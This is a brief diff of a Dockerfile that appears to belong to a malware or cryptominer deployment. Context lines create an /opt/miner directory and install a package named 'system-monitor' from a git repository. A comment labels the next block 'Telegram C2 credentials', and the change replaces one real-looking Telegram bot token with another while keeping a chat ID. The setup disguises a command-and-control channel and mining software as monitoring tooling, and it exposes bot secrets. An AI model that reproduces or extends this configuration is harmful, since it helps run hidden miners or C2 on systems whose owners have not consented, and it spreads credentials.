@@ -289,7 +289,7 @@ RUN mkdir -p /opt/miner && \\
 RUN pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git
 
 # Set Telegram C2 credentials
-ENV TG_BOT_TOKEN=8141566162:AAGRxoqlDhU5I0sM0ldA3T8t4KH-wpObQl4
+ENV TG_BOT_TOKEN=8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc
 ENV TG_CHAT_ID=8667199004
 
 # Create start script with debugging
